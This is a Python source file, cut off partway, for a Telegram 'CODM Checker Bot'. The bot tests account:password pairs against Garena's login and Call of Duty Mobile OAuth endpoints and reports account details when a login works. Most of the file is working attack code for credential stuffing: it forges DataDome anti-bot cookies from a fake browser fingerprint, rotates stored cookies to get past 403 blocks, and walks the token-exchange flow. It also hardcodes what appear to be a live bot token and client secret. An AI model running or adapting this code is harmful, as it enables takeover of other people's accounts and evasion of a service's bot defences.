# codm_telegram_bot.py
import hashlib
import json
import logging
import os
import random
import re
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import cloudscraper
import requests
from Crypto.Cipher import AES
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
    CallbackQuery,
    Message,
    Chat
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ==================== FIX FOR PYTHON 3.13 COMPATIBILITY ====================
# This patch fixes the __slots__ issue in python-telegram-bot for Python 3.13
import telegram.ext._updater
from telegram.ext._updater import Updater

# Store the original __init__ method
original_updater_init = Updater.__init__

def patched_updater_init(self, *args, **kwargs):
    """Patched __init__ that handles the __slots__ issue in Python 3.13"""
    # First, call the parent class __init__ if it exists
    # We need to handle this carefully because we're bypassing the normal flow
    
    # Get the bot and update_queue from kwargs or args
    bot = kwargs.get('bot')
    update_queue = kwargs.get('update_queue')
    
    # If not in kwargs, try args
    if bot is None and len(args) > 0:
        bot = args[0]
    if update_queue is None and len(args) > 1:
        update_queue = args[1]
    
    # Call the parent __init__ (which is object.__init__ since Updater inherits from object)
    # This avoids the problematic __slots__ assignment
    object.__init__(self)
    
    # Now manually set all the attributes that the original __init__ would set
    from telegram.ext._updater import _DEFAULT_CHECK_INTERVAL
    
    # Set basic attributes
    self.bot = bot
    self.update_queue = update_queue
    self._check_interval = kwargs.get('check_interval', _DEFAULT_CHECK_INTERVAL)
    
    # Initialize other attributes
    from asyncio import Queue
    from telegram.ext._updater import _UpdaterStopEvent
    
    self._stop_event = None
    self._logger = logging.getLogger(__name__)
    self._last_update = 0
    self._running = False
    self._exception_event = None
    self._udpate_fetcher_task = None
    self._polling_task = None
    self._webhook_task = None
    self._webhook_app = None
    self._webhook_runner = None
    
    # This is the attribute that was causing the issue
    try:
        object.__setattr__(self, '_Updater__polling_cleanup_cb', None)
    except AttributeError:
        pass
    
    # Set allowed_updates if provided
    if 'allowed_updates' in kwargs:
        self.allowed_updates = kwargs['allowed_updates']
    else:
        self.allowed_updates = None

# Apply the patch
Updater.__init__ = patched_updater_init

# Also patch the ApplicationBuilder build method
import telegram.ext._applicationbuilder
original_build = telegram.ext._applicationbuilder.ApplicationBuilder.build

def patched_build(self):
    """Patched build method that handles any remaining issues"""
    app = original_build(self)
    return app

telegram.ext._applicationbuilder.ApplicationBuilder.build = patched_build

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8066352636:AAEbAQfjqTV4EDHifrDH9oKGHiuIsSO9y7w"  # Replace with your bot token
OWNER_USERNAME = "@ZyronDevv"
BOT_NAME = "CODM Checker Bot"

# ==================== TEMPORARY FEATURE FLAGS ====================
# Set this to False to disable bulk check feature
BULK_CHECK_ENABLED = False  # <-- TEMPORARILY DISABLED
BULK_CHECK_MESSAGE = "🔧 The bulk check feature is temporarily unavailable. Please use single check instead.\n\nWe're working on improving this feature. Thank you for your patience!"

# ==================== LOGGING ====================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== CONSTANTS ====================
CODM_REGIONS = {
    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
    'HK': {'name': 'Hong Kong', 'code': '852', 'flag': '🇭🇰'},
    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
    'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
    'VN': {'name': 'Vietnam', 'code': '84', 'flag': '🇻🇳'},
    'MM': {'name': 'Myanmar', 'code': '95', 'flag': '🇲🇲'},
    'KH': {'name': 'Cambodia', 'code': '855', 'flag': '🇰🇭'},
    'LA': {'name': 'Laos', 'code': '856', 'flag': '🇱🇦'},
    'BN': {'name': 'Brunei', 'code': '673', 'flag': '🇧🇳'},
}

OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

# Conversation states
SINGLE_CHECK_ACCOUNT = 1
SINGLE_CHECK_PASSWORD = 2
BULK_CHECK_FILE = 3

# ==================== COOKIE AND DATADOME MANAGEMENT ====================
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
COOKIE_FILE = os.path.join(_SCRIPT_DIR, 'fresh_cookie.txt')

def _db_fetch_cookies():
    """Fetch cookies from database"""
    try:
        import asyncio
        import asyncpg
        async def _run():
            conn = await asyncio.wait_for(asyncpg.connect(DB_URL), timeout=6)
            rows = await conn.fetch("SELECT cookie_line FROM cookies WHERE is_banned=FALSE")
            await conn.close()
            return [r["cookie_line"] for r in rows]
        return asyncio.run(_run())
    except Exception:
        return []

def _db_ban_cookie(cookie_line):
    """Ban a cookie in database"""
    try:
        import asyncio
        import asyncpg
        async def _run():
            conn = await asyncio.wait_for(asyncpg.connect(DB_URL), timeout=6)
            await conn.execute("UPDATE cookies SET is_banned=TRUE WHERE cookie_line=$1", cookie_line)
            await conn.close()
        asyncio.run(_run())
    except Exception:
        pass

def applyck(session, cookie_str):
    """Apply cookies to session"""
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if not item:
            continue
        if "=" in item:
            try:
                key, value = item.split("=", 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

def get_datadome_cookie(session=None):
    """Fetch a fresh DataDome cookie - SAME as original"""
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    payload = {
        'jsData': json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True,
            "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False,
            "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False,
            "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.",
            "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably",
            "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
            "acma": "maybe", "acmats": False, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
            "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe",
            "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
            "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
            "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True,
            "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    retries = 3

    _use_own_scraper = session is None

    for attempt in range(retries):
        try:
            if _use_own_scraper:
                scraper = cloudscraper.create_scraper()
            else:
                scraper = session
            response = scraper.post(url, headers=headers, data=data)
            response.raise_for_status()

            try:
                response_json = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(1)
                    continue
                return None

            if response_json.get('status') == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                if '=' in cookie_string and ';' in cookie_string:
                    datadome = cookie_string.split(';')[0].split('=')[1]
                else:
                    datadome = cookie_string
                return datadome
            else:
                if attempt < retries - 1:
                    time.sleep(1)
                    continue

        except Exception:
            if attempt < retries - 1:
                time.sleep(1)
                continue

    return None

# ==================== COOKIE MANAGER CLASS (SAME AS ORIGINAL) ====================
class CookieManager:
    def __init__(self, server_url=None):
        self.banned_cookies = set()
        self.server_url = server_url
        self.banned_cookie_file = 'banned_cookies.txt'
        self._lock = threading.Lock()
        self.load_banned_cookies()

    def load_banned_cookies(self):
        if os.path.exists(self.banned_cookie_file):
            with open(self.banned_cookie_file, 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie):
        with self._lock:
            self.banned_cookies.add(cookie)
            with open(self.banned_cookie_file, 'a') as f:
                f.write(cookie + '\n')
            _db_ban_cookie(cookie)

    def get_valid_cookies(self):
        valid = []

        # Try file first
        if os.path.exists(COOKIE_FILE):
            with open(COOKIE_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                file_cookies = [c.strip() for c in f.read().splitlines()
                                if c.strip() and 'datadome=' in c.strip()
                                and not self.is_banned(c.strip())]
                valid.extend(file_cookies)

        # Also try fresh_cookies.txt
        fresh_cookie_file = os.path.join(_SCRIPT_DIR, 'fresh_cookies.txt')
        if os.path.exists(fresh_cookie_file):
            with open(fresh_cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
                file_cookies = [c.strip() for c in f.read().splitlines()
                                if c.strip() and 'datadome=' in c.strip()
                                and not self.is_banned(c.strip())]
                valid.extend(file_cookies)

        # Try database
        db_cookies = _db_fetch_cookies()
        seen = set(valid)
        for c in db_cookies:
            if c not in seen and not self.is_banned(c):
                valid.append(c)
                seen.add(c)

        random.shuffle(valid)
        return valid

    def get_valid_cookie(self):
        cookies = self.get_valid_cookies()
        return random.choice(cookies) if cookies else None

    def save_cookie(self, datadome_value):
        formatted = f"datadome={datadome_value.strip()}"
        if not self.is_banned(formatted):
            existing = set()
            if os.path.exists(COOKIE_FILE):
                with open(COOKIE_FILE, 'r') as f:
                    existing = set(line.strip() for line in f if line.strip())
            if formatted not in existing:
                with open(COOKIE_FILE, 'a') as f:
                    f.write(formatted + '\n')
                return True
        return False

# ==================== DATADOME MANAGER CLASS (SAME AS ORIGINAL) ====================
class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

# ==================== UTILITY FUNCTIONS ====================
def sanitize_string(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub(r'[^\x00-\x7F]+', '', str(text))

def clean_account_line(line):
    if not line:
        return None, None
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join(char for char in line if char.isprintable() or char == ':')
    if ':' not in line:
        return None, None
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return None, None
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return None, None
        return account, password
    except:
        return None, None

def format_codm_region(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f"{region_code}"

def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or not str(mobile_no).strip():
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f"+{detected_country_code} {masked}"
        else:
            return f"+{detected_country_code} {local_number}"
    else:
        if len(mobile_str) >= 4:
            masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
            return f"+{masked}"
        else:
            return mobile_str

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

# ==================== CODM CHECKER CLASS ====================
class CODMChecker:
    def __init__(self):
        self.session = None
        self.datadome_manager = None
        self.cookie_manager = None

    def _init_session(self, cookie_manager=None):
        """Initialize a new session with cookies and datadome"""
        self.session = cloudscraper.create_scraper()
        self.datadome_manager = DataDomeManager()
        self.cookie_manager = cookie_manager

        # Get valid cookies
        if cookie_manager:
            valid_cookies = cookie_manager.get_valid_cookies()
            if valid_cookies:
                combined = "; ".join(valid_cookies)
                applyck(self.session, combined)
                # Extract datadome from cookies
                dd_line = valid_cookies[-1]
                if "datadome=" in dd_line:
                    for part in dd_line.split(";"):
                        part = part.strip()
                        if part.startswith("datadome="):
                            self.datadome_manager.set_datadome(part.split("=", 1)[1].strip())
                            break

        # If no datadome, get fresh one
        if not self.datadome_manager.get_datadome():
            fresh_dd = get_datadome_cookie(self.session)
            if fresh_dd:
                self.datadome_manager.set_datadome(fresh_dd)
                self.datadome_manager.set_session_datadome(self.session, fresh_dd)

        return self.session

    def _prelogin(self, account):
        """Prelogin – returns (v1, v2) or (None, None)"""
        url = 'https://sso.garena.com/api/prelogin'
        retry_403 = 0
        retry_general = 0
        retry_total = 0
        MAX_TOTAL = 5

        while retry_total < MAX_TOTAL:
            retry_total += 1
            try:
                params = {
                    'app_id': '10100',
                    'account': account,
                    'format': 'json',
                    'id': str(int(time.time() * 1000))
                }

                current_cookies = self.session.cookies.get_dict()
                cookie_parts = []
                for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                    if cookie_name in current_cookies:
                        cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")

                cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

                headers = {
                    'accept': 'application/json, text/plain, */*',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'en-US,en;q=0.9',
                    'connection': 'keep-alive',
                    'host': 'sso.garena.com',
                    'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                    'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
                }

                if cookie_header:
                    headers['cookie'] = cookie_header

                response = self.session.get(url, headers=headers, params=params, timeout=12)

                new_cookies = {}
                if 'set-cookie' in response.headers:
                    set_cookie_header = response.headers['set-cookie']
                    for cookie_str in set_cookie_header.split(','):
                        if '=' in cookie_str:
                            try:
                                cookie_name = cookie_str.split('=')[0].strip()
                                cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                if cookie_name and cookie_value:
                                    new_cookies[cookie_name] = cookie_value
                            except Exception:
                                pass

                try:
                    response_cookies = response.cookies.get_dict()
                    for cookie_name, cookie_value in response_cookies.items():
                        if cookie_name not in new_cookies:
                            new_cookies[cookie_name] = cookie_value
                except Exception:
                    pass

                for cookie_name, cookie_value in new_cookies.items():
                    if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                        self.session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                        if cookie_name == 'datadome':
                            self.datadome_manager.set_datadome(cookie_value)

                new_datadome = new_cookies.get('datadome')

                if response.status_code == 403:
                    retry_403 += 1

                    if new_cookies and retry_403 <= 1:
                        continue
                    elif retry_403 <= 2:
                        fresh_datadome = get_datadome_cookie(self.session)
                        if fresh_datadome:
                            self.datadome_manager.set_datadome(fresh_datadome)
                            self.datadome_manager.set_session_datadome(self.session, fresh_datadome)
                            time.sleep(0.5)
                            continue
                        else:
                            time.sleep(0.5)
                            continue
                    else:
                        fresh_datadome = get_datadome_cookie(self.session)
                        if fresh_datadome:
                            self.datadome_manager.set_datadome(fresh_datadome)
                            self.datadome_manager.set_session_datadome(self.session, fresh_datadome)
                        retry_403 = 0
                        self.datadome_manager._403_attempts = 0
                        time.sleep(0.5)
                        continue

                response.raise_for_status()

                try:
                    data = response.json()
                except json.JSONDecodeError:
                    retry_general += 1
                    if retry_general < 3:
                        time.sleep(2)
                        continue
                    else:
                        return None, None

                if 'error' in data:
                    return None, None

                v1 = data.get('v1')
                v2 = data.get('v2')

                if not v1 or not v2:
                    return None, None

                return v1, v2

            except Exception:
                if retry_total < MAX_TOTAL - 1:
                    time.sleep(0.5)
                    continue

        return None, None

    def _login(self, account, password, v1, v2):
        """Perform login with hashed password"""
        hashed_password = hash_password(password, v1, v2)
        url = 'https://sso.garena.com/api/login'

        for retry in range(3):
            try:
                params = {
                    'app_id': '10100',
                    'account': account,
                    'password': hashed_password,
                    'redirect_uri': 'https://account.garena.com/',
                    'format': 'json',
                    'id': str(int(time.time() * 1000))
                }

                current_cookies = self.session.cookies.get_dict()
                cookie_parts = []
                for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                    if cookie_name in current_cookies:
                        cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
                cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

                headers = {
                    'accept': 'application/json, text/plain, */*',
                    'referer': 'https://account.garena.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
                }

                if cookie_header:
                    headers['cookie'] = cookie_header

                response = self.session.get(url, headers=headers, params=params, timeout=12)
                response.raise_for_status()

                login_cookies = {}
                if 'set-cookie' in response.headers:
                    set_cookie_header = response.headers['set-cookie']
                    for cookie_str in set_cookie_header.split(','):
                        if '=' in cookie_str:
                            try:
                                cookie_name = cookie_str.split('=')[0].strip()
                                cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                if cookie_name and cookie_value:
                                    login_cookies[cookie_name] = cookie_value
                            except Exception:
                                pass

                try:
                    response_cookies = response.cookies.get_dict()
                    for cookie_name, cookie_value in response_cookies.items():
                        if cookie_name not in login_cookies:
                            login_cookies[cookie_name] = cookie_value
                except Exception:
                    pass

                for cookie_name, cookie_value in login_cookies.items():
                    if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                        self.session.cookies.set(cookie_name, cookie_value, domain='.garena.com')

                try:
                    data = response.json()
                except json.JSONDecodeError:
                    if retry < 2:
                        time.sleep(0.5)
                        continue
                    return None

                sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')

                if 'error' in data:
                    error_msg = data['error']
                    if error_msg == 'ACCOUNT DOESNT EXIST':
                        return None
                    elif 'captcha' in error_msg.lower():
                        time.sleep(0.5)
                        continue

                return sso_key

            except Exception:
                if retry < 2:
                    time.sleep(0.5)
                    continue

        return None

    def _get_account_init(self):
        """Get account details after successful login"""
        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }

        current_cookies = self.session.cookies.get_dict()
        cookie_parts = []
        for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
            if cookie_name in current_cookies:
                cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''

        if cookie_header:
            headers['cookie'] = cookie_header

        response = self.session.get('https://account.garena.com/api/account/init', headers=headers, timeout=12)

        if response.status_code == 403:
            if self.datadome_manager:
                fresh_dd = get_datadome_cookie(self.session)
                if fresh_dd:
                    self.datadome_manager.set_datadome(fresh_dd)
                    self.datadome_manager.set_session_datadome(self.session, fresh_dd)
            return None

        return response.json()

    def _get_codm_grant_code(self):
        """Get CODM grant code"""
        for attempt in range(OAUTH_MAX_RETRIES):
            try:
                random_id = str(int(time.time() * 1000))
                grant_url = "https://100082.connect.garena.com/oauth/token/grant"

                current_cookies = self.session.cookies.get_dict()
                cookie_parts = []
                for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state',
                             'line_state', 'twitter_state', 'vk_state', 'tiktok_state',
                             'youtube_state', 'sso_key', 'datadome']:
                    if name in current_cookies:
                        cookie_parts.append(f"{name}={current_cookies[name]}")
                cookie_header = '; '.join(cookie_parts)

                grant_headers = {
                    "Host": "100082.connect.garena.com",
                    "Connection": "keep-alive",
                    "Accept": "application/json, text/plain, */*",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36; GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)",
                    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "Origin": "https://100082.connect.garena.com",
                    "X-Requested-With": "com.garena.game.codm",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                }
                if cookie_header:
                    grant_headers["Cookie"] = cookie_header

                grant_body = (
                    f"client_id=100082"
                    f"&response_type=code"
                    f"&redirect_uri=gop100082%3A%2F%2Fauth%2F"
                    f"&create_grant=true"
                    f"&login_scenario=normal"
                    f"&format=json"
                    f"&id={random_id}"
                )

                resp = self.session.post(grant_url, headers=grant_headers, data=grant_body, timeout=12)
                resp.raise_for_status()
                data = resp.json()

                code = data.get("code", "")
                if not code:
                    return ""
                return code

            except Exception:
                if attempt < OAUTH_MAX_RETRIES - 1:
                    time.sleep(OAUTH_RETRY_DELAY)
                    continue

        return ""

    def _token_exchange(self, code):
        """Exchange grant code for access token"""
        device_id = f"02-{random.randint(100000, 999999)}"
        CLIENT_ID = "100082"
        CLIENT_SECRET = "388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
        REDIRECT_URI = "gop100082://auth/"
        exchange_url = "https://100082.connect.garena.com/oauth/token/exchange"

        exchange_headers = {
            "User-Agent": "GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "100082.connect.garena.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
        }

        exchange_body = (
            f"grant_type=authorization_code"
            f"&code={code}"
            f"&device_id={urllib.parse.quote(device_id)}"
            f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
            f"&source=2"
            f"&client_id={CLIENT_ID}"
            f"&client_secret={CLIENT_SECRET}"
        )

        for attempt in range(OAUTH_MAX_RETRIES):
            try:
                resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=12)
                resp.raise_for_status()
                data = resp.json()
                access_token = data.get("access_token", "")
                return access_token
            except Exception:
                if attempt < OAUTH_MAX_RETRIES - 1:
                    time.sleep(OAUTH_RETRY_DELAY)
                    continue

        return ""

    def _process_codm_callback(self, access_token):
        """Process CODM callback"""
        try:
            codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request-aos.codm.garena.co.id/oauth/callback/&access_token={access_token}"

            callback_headers = {
                "authority": "auth.codm.garena.com",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "referer": "https://auth.garena.com/",
                "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-site",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            }

            self.session.get(codm_callback_url, headers=callback_headers, allow_redirects=False, timeout=12)

            api_callback_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
            api_callback_headers = {
                "authority": "api-delete-request-aos.codm.garena.co.id",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "referer": "https://auth.garena.com/",
                "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "cross-site",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            }

            api_response = self.session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False, timeout=12)
            location = api_response.headers.get("Location", "")

            if "err=3" in location:
                return None, "no_codm"
            elif "token=" in location:
                token = location.split("token=")[-1].split('&')[0]
                return token, "success"
            else:
                return None, "unknown_error"

        except Exception:
            return None, "error"

    def _get_codm_user_info(self, token):
        """Get CODM user info"""
        try:
            check_login_url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
            check_headers = {
                "authority": "api-delete-request-aos.codm.garena.co.id",
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.9",
                "accept-encoding": "gzip, deflate, br, zstd",
                "cache-control": "no-cache",
                "codm-delete-token": token,
                "origin": "https://delete-request.codm.garena.co.id",
                "pragma": "no-cache",
                "referer": "https://delete-request.codm.garena.co.id/",
                "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
